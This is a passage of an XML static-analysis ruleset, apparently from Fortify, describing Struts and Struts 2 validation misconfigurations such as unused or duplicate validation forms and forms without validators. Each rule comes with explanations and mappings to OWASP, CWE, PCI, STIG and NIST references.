																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3510 CAT I</em> <br></p>
																									   <p>[9] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 101</em> <br></p>
																									   <p>[10] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M1 Weak Server Side Controls</em> <br></p>
																									   <p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.3.1.1</em> <br></p>
																									   <p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[14] Standards Mapping - FIPS200 - (FISMA) <em>SI</em> <br></p>
																									   <p>[15] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SI-10 Information Input Validation (P1)</em> <br></p>
																									   <p>[16] T. Husted et al. <em>Struts in Action: Building Web Applications with the Leading Java Framework</em> Manning Publications<br></p>
																									   <p>[17]  <em>The Struts Project</em> The Apache Foundation<br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>input-validation-and-representation</tag>
	</rule>
	<rule>
		<key>input_validation_and_representation_struts_2_validation_file_without_action
		</key>
		<internalKey>Input Validation and Representation/Struts 2/Validation
			File Without Action
		</internalKey>
		<name>Struts 2: Validation File Without Action</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Struts2 Validation file found with no corresponding Struts2 Action.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  A Struts2 Validation file was discovered without a matching Struts2 Action. For each ActionClass, Struts2 searches for a corresponding ActionClass-validation.xml for the necessary validation constraints. In this case, a validation file in the form of ActionClass-validation.xml was found, but ActionClass does not match an Action defined in the Struts2 configuration file.<br><br>	    It is easy for developers to forget to update validation logic when they remove or rename action form mappings. One indication that validation logic is not being properly maintained is the presence of an unused validation form.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A10 Insecure Configuration Management</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A6 Security Misconfiguration</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3510 CAT I</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3510 CAT I</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3510 CAT I</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3510 CAT I</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3510 CAT I</em> <br></p>
																									   <p>[9] Standards Mapping - FIPS200 - (FISMA) <em>CM</em> <br></p>
																									   <p>[10] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 101</em> <br></p>
																									   <p>[11] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M1 Weak Server Side Controls</em> <br></p>
																									   <p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.10</em> <br></p>
																									   <p>[13] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SI-10 Information Input Validation (P1)</em> <br></p>
																									   <p>[14]  <em>The Struts2 Validation Framework</em> The Apache Foundation<br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>input-validation-and-representation</tag>
	</rule>
	<rule>
		<key>input_validation_and_representation_struts_2_validator_without_action_field
		</key>
		<internalKey>Input Validation and Representation/Struts 2/Validator
			Without Action Field
		</internalKey>
		<name>Struts 2: Validator Without Action Field</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  A Struts2 validator is defined for an action field that does not exist.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  A Struts2 validator definition refers to an action field that does not exist.<br><br>	    It is easy for developers to forget to update validation logic when they remove or rename action form mappings. One indication that validation logic is not being properly maintained is the presence of an orphaned validator definition.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A10 Insecure Configuration Management</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A6 Security Misconfiguration</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3510 CAT I</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3510 CAT I</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3510 CAT I</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3510 CAT I</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3510 CAT I</em> <br></p>
																									   <p>[9] Standards Mapping - FIPS200 - (FISMA) <em>CM</em> <br></p>
																									   <p>[10] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 101</em> <br></p>
																									   <p>[11] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M1 Weak Server Side Controls</em> <br></p>
																									   <p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.10</em> <br></p>
																									   <p>[13] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SI-10 Information Input Validation (P1)</em> <br></p>
																									   <p>[14] T. Husted et al. <em>Struts in Action: Building Web Applications with the Leading Java Framework</em> Manning Publications<br></p>
																									   <p>[15]  <em>The Struts2 Validation Framework</em> The Apache Foundation<br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>input-validation-and-representation</tag>
	</rule>
	<rule>
		<key>input_validation_and_representation_struts_duplicate_validation_forms
		</key>
		<internalKey>Input Validation and Representation/Struts/Duplicate
			Validation Forms
		</internalKey>
		<name>Struts: Duplicate Validation Forms</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Multiple validation forms with the same name indicate that validation logic is not up-to-date.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  If two validation forms have the same name, the Struts Validator arbitrarily chooses one of the forms to use for input validation and discards the other. This decision might not correspond to the programmer's expectations. Moreover, it indicates that the validation logic is not being maintained, and can indicate that other, more subtle, validation errors are present.<br><br><b>Example:</b> Two validation forms with the same name.<br><br><pre><br>&lt;form-validation&gt;<br>    &lt;formset&gt;<br>        &lt;form name="ProjectForm"&gt;<br>        ...<br>        &lt;/form&gt;<br>        &lt;form name="ProjectForm"&gt;<br>        ...<br>        &lt;/form&gt;<br>    &lt;/formset&gt;<br>&lt;/form-validation&gt;<br></pre><br><br>It is critically important that validation logic be maintained and kept in sync with the rest of the application. Unchecked input is the root cause of some of today's worst and most common software security problems. Cross-site scripting, SQL injection, and process control vulnerabilities all stem from incomplete or absent input validation. Although J2EE applications are not generally susceptible to memory corruption attacks, if a J2EE application interfaces with native code that does not perform array bounds checking, an attacker may be able to use an input validation mistake in the J2EE application to launch a buffer overflow attack.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A10 Insecure Configuration Management</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A6 Security Misconfiguration</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3510 CAT I</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3510 CAT I</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3510 CAT I</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3510 CAT I</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3510 CAT I</em> <br></p>
																									   <p>[9] Standards Mapping - FIPS200 - (FISMA) <em>CM</em> <br></p>
																									   <p>[10] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 102</em> <br></p>
																									   <p>[11] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M1 Weak Server Side Controls</em> <br></p>
																									   <p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.10</em> <br></p>
																									   <p>[13] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SI-10 Information Input Validation (P1)</em> <br></p>
																									   <p>[14] T. Husted et al. <em>Struts in Action: Building Web Applications with the Leading Java Framework</em> Manning Publications<br></p>
																									   <p>[15]  <em>The Struts project</em> The Apache Foundation<br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>input-validation-and-representation</tag>
	</rule>
	<rule>
		<key>input_validation_and_representation_struts_erroneous_validate___method
		</key>
		<internalKey>Input Validation and Representation/Struts/Erroneous
			validate() Method
		</internalKey>
		<name>Struts: Erroneous validate() Method</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  The validator form defines a <code>validate()</code> method that fails to call <code>super.validate()</code>.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  The Struts Validator uses a form's <code>validate()</code> method to check the contents of the form properties against the constraints specified in the associated validation form. That means the following classes have a <code>validate()</code> method that is part of the validation framework:<br><br><pre><br>    ValidatorForm<br>    ValidatorActionForm<br>    DynaValidatorForm<br>    DynaValidatorActionForm<br></pre><br><br>If you create a class that extends one of these classes and if your class implements custom validation logic by overriding the <code>validate()</code> method, you must call <code>super.validate()</code> in your <code>validate()</code> implementation. If you do not, the Validation Framework cannot check the contents of the form against a validation form. In other words, the validation framework will be disabled for the given form.<br><br>Disabling the validation framework for a form exposes the application to numerous types of attacks. Unchecked input is the root cause of vulnerabilities like cross-site scripting, process control, and SQL injection. Although J2EE applications are not generally susceptible to memory corruption attacks, if a J2EE application interfaces with native code that does not perform array bounds checking, an attacker may be able to use an input validation mistake in the J2EE application to launch a buffer overflow attack.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A1 Unvalidated Input</em> <br></p>
																									   <p>[2] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3510 CAT I</em> <br></p>
																									   <p>[3] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3510 CAT I</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3510 CAT I</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3510 CAT I</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3510 CAT I</em> <br></p>
																									   <p>[7] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 103</em> <br></p>
																									   <p>[8] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.3.1.1</em> <br></p>
																									   <p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.6</em> <br></p>
																									   <p>[11] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SI-10 Information Input Validation (P1)</em> <br></p>
																									   <p>[12] T. Husted et al. <em>Struts in Action: Building Web Applications with the Leading Java Framework</em> Manning Publications<br></p>
																									   <p>[13]  <em>The Struts project</em> The Apache Foundation<br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>input-validation-and-representation</tag>
	</rule>
	<rule>
		<key>input_validation_and_representation_struts_form_does_not_extend_validation_class
		</key>
		<internalKey>Input Validation and Representation/Struts/Form Does Not
			Extend Validation Class
		</internalKey>
		<name>Struts: Form Does Not Extend Validation Class</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  All Struts forms should extend a Validator class.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  In order to use the Struts Validator, a form must extend one of the following:<br><br><pre><br>ValidatorForm<br>ValidatorActionForm<br>DynaValidatorActionForm<br>DynaValidaorForm<br></pre><br><br>You must extend one of these classes because the Struts Validator ties in to your application by implementing the <code>validate()</code> method in these classes.<br><br>Forms derived from the following classes <b>cannot</b> use the Struts Validator:<br><br><pre><br>ActionForm<br>DynaActionForm<br></pre><br><br>Bypassing the validation framework for a form exposes the application to numerous types of attacks. Unchecked input is the root cause of vulnerabilities like cross-site scripting, process control, and SQL injection. Although J2EE applications are not generally susceptible to memory corruption attacks, if a J2EE application interfaces with native code that does not perform array bounds checking, an attacker may be able to use an input validation mistake in the J2EE application to launch a buffer overflow attack.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A1 Unvalidated Input</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[3] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3510 CAT I</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3510 CAT I</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3510 CAT I</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3510 CAT I</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3510 CAT I</em> <br></p>
																									   <p>[8] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 104</em> <br></p>
																									   <p>[9] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M1 Weak Server Side Controls</em> <br></p>
																									   <p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.3.1.1</em> <br></p>
																									   <p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[12] Standards Mapping - FIPS200 - (FISMA) <em>SI</em> <br></p>
																									   <p>[13] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SI-10 Information Input Validation (P1)</em> <br></p>
																									   <p>[14] T. Husted et al. <em>Struts in Action: Building Web Applications with the Leading Java Framework</em> Manning Publications<br></p>
																									   <p>[15]  <em>The Struts project</em> The Apache Foundation<br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>input-validation-and-representation</tag>
	</rule>
	<rule>
		<key>input_validation_and_representation_struts_form_field_without_validator
		</key>
		<internalKey>Input Validation and Representation/Struts/Form Field
			Without Validator
		</internalKey>
		<name>Struts: Form Field Without Validator</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Every field in a form should be validated in the corresponding validation form.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Omitting validation for even a single input field can allow attackers the leeway they need.<br><br>Unchecked input is the root cause of some of today's worst and most common software security problems. Cross-site scripting, SQL injection, and process control vulnerabilities all stem from incomplete or absent input validation. Although J2EE applications are not generally susceptible to memory corruption attacks, if a J2EE application interfaces with native code that does not perform array bounds checking, an attacker may be able to use an input validation mistake in the J2EE application to launch a buffer overflow attack.<br><br>Some applications use the same <code>ActionForm</code> for more than one purpose. In situations like this, some fields may go unused under some action mappings. <b>It is critical that unused fields be validated too.</b> Preferably, unused fields should be constrained so that they can only be empty or undefined. If unused fields are not validated, shared business logic in an action could allow attackers to bypass the validation checks that are performed for other uses of the form.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A1 Unvalidated Input</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A6 Security Misconfiguration</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3510 CAT I</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3510 CAT I</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3510 CAT I</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3510 CAT I</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3510 CAT I</em> <br></p>
																									   <p>[9] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 105</em> <br></p>
																									   <p>[10] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M1 Weak Server Side Controls</em> <br></p>
																									   <p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.3.1.1</em> <br></p>
																									   <p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[14] Standards Mapping - FIPS200 - (FISMA) <em>SI</em> <br></p>
																									   <p>[15] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SI-10 Information Input Validation (P1)</em> <br></p>
																									   <p>[16] T. Husted et al. <em>Struts in Action: Building Web Applications with the Leading Java Framework</em> Manning Publications<br></p>
																									   <p>[17]  <em>The Struts project</em> The Apache Foundation<br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>input-validation-and-representation</tag>
	</rule>
	<rule>
		<key>input_validation_and_representation_struts_plugin_framework_not_in_use
		</key>
		<internalKey>Input Validation and Representation/Struts/Plugin
			Framework Not In Use
		</internalKey>
		<name>Struts: Plugin Framework Not In Use</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Use the Struts Validator to prevent vulnerabilities that result from unchecked input.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Unchecked input is the leading cause of vulnerabilities in J2EE applications. Unchecked input leads to cross-site scripting, process control, and SQL injection vulnerabilities, among others. Although J2EE applications are not generally susceptible to memory corruption attacks, if a J2EE application interfaces with native code that does not perform array bounds checking, an attacker may be able to use an input validation mistake in the J2EE application to launch a buffer overflow attack.<br><br>To prevent such attacks, use the Struts Validator to check all program input before it is processed by the application. Use HP Fortify Static Code Analyzer to ensure that there are no holes in your configuration of the Struts Validator.<br><br>Example uses of the validator include checking to ensure that:<br><br>- Phone number fields contain only valid characters in phone numbers<br><br>- Boolean values are only "T" or "F"<br><br>- Free-form strings are of a reasonable length and composition
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A1 Unvalidated Input</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A6 Security Misconfiguration</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3510 CAT I</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3510 CAT I</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3510 CAT I</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3510 CAT I</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3510 CAT I</em> <br></p>
																									   <p>[9] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 106</em> <br></p>
																									   <p>[10] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M1 Weak Server Side Controls</em> <br></p>
																									   <p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.3.1.1</em> <br></p>
																									   <p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[14] Standards Mapping - FIPS200 - (FISMA) <em>SI</em> <br></p>
																									   <p>[15] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SI-10 Information Input Validation (P1)</em> <br></p>
																									   <p>[16] T. Husted et al. <em>Struts in Action: Building Web Applications with the Leading Java Framework</em> Manning Publications<br></p>
																									   <p>[17]  <em>The Struts Project</em> The Apache Foundation<br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>input-validation-and-representation</tag>
	</rule>
	<rule>
		<key>input_validation_and_representation_struts_unused_action_form
		</key>
		<internalKey>Input Validation and Representation/Struts/Unused Action
			Form
		</internalKey>
		<name>Struts: Unused Action Form</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  An unused action form indicates that application logic might not be up-to-date.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Struts uses <code>form-bean</code> entries to map HTML forms to actions. If the <code>&lt;action-mappings&gt;</code> element of the Struts configuration file does not contain an entry that corresponds to a relevant action form defined via a <code>&lt;form-bean&gt;</code> tag, the application logic might not be up-to-date.<br><br><b>Example 1:</b> The following configuration does not contain a mapping for <code>bean2</code>.<br><pre><br>&lt;form-beans&gt;<br>  &lt;form-bean name="bean1" type="coreservlets.UserFormBean1" /&gt;<br>  &lt;form-bean name="bean2" type="coreservlets.UserFormBean2" /&gt;<br>&lt;/form-beans&gt;<br><br>&lt;action-mappings&gt;<br>  &lt;action path="/actions/register1" type="coreservlets.RegisterAction1" name="bean1" scope="request" /&gt;<br>&lt;/action-mappings&gt;<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A6 Security Misconfiguration</em> <br></p>
																									   <p>[3]  <em>Apache Struts 1.3 Specification</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M1 Weak Server Side Controls</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>input-validation-and-representation</tag>
	</rule>
	<rule>
		<key>input_validation_and_representation_struts_unused_validation_form
		</key>
		<internalKey>Input Validation and Representation/Struts/Unused
			Validation Form
		</internalKey>
		<name>Struts: Unused Validation Form</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  An unused validation form indicates that validation logic is not up-to-date.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  It is easy for developers to forget to update validation logic when they remove or rename action form mappings. One indication that validation logic is not being properly maintained is the presence of an unused validation form.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A10 Insecure Configuration Management</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A6 Security Misconfiguration</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3510 CAT I</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3510 CAT I</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3510 CAT I</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3510 CAT I</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3510 CAT I</em> <br></p>
																									   <p>[9] Standards Mapping - FIPS200 - (FISMA) <em>CM</em> <br></p>
																									   <p>[10] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 107</em> <br></p>
																									   <p>[11] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M1 Weak Server Side Controls</em> <br></p>
																									   <p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.10</em> <br></p>
																									   <p>[13] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SI-10 Information Input Validation (P1)</em> <br></p>
																									   <p>[14] T. Husted et al. <em>Struts in Action: Building Web Applications with the Leading Java Framework</em> Manning Publications<br></p>
																									   <p>[15]  <em>The Struts project</em> The Apache Foundation<br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>input-validation-and-representation</tag>
	</rule>
	<rule>
		<key>input_validation_and_representation_struts_unvalidated_action_form
		</key>
		<internalKey>Input Validation and Representation/Struts/Unvalidated
			Action Form
		</internalKey>
		<name>Struts: Unvalidated Action Form</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Every Action Form must have a corresponding validation form.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  If a Struts Action Form Mapping specifies a form, it must have a validation form defined under the Struts Validator. If an action form mapping does not have a validation form defined, it might be vulnerable to a number of attacks that rely on unchecked input.<br><br>Unchecked input is the root cause of some of today's worst and most common software security problems. Cross-site scripting, SQL injection, and process control vulnerabilities all stem from incomplete or absent input validation. Although J2EE applications are not generally susceptible to memory corruption attacks, if a J2EE application interfaces with native code that does not perform array bounds checking, an attacker may be able to use an input validation mistake in the J2EE application to launch a buffer overflow attack.<br><br>An action or a form may perform validation in other ways, but the Struts Validator provides an excellent way to verify that all input receives at least a basic level of checking. Without this approach, it is difficult, and often impossible, to establish with a high level of confidence that all input is validated.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A1 Unvalidated Input</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A6 Security Misconfiguration</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3510 CAT I</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3510 CAT I</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3510 CAT I</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3510 CAT I</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3510 CAT I</em> <br></p>
																									   <p>[9] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 108</em> <br></p>
																									   <p>[10] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M1 Weak Server Side Controls</em> <br></p>
																									   <p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.3.1.1</em> <br></p>
																									   <p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[14] Standards Mapping - FIPS200 - (FISMA) <em>SI</em> <br></p>
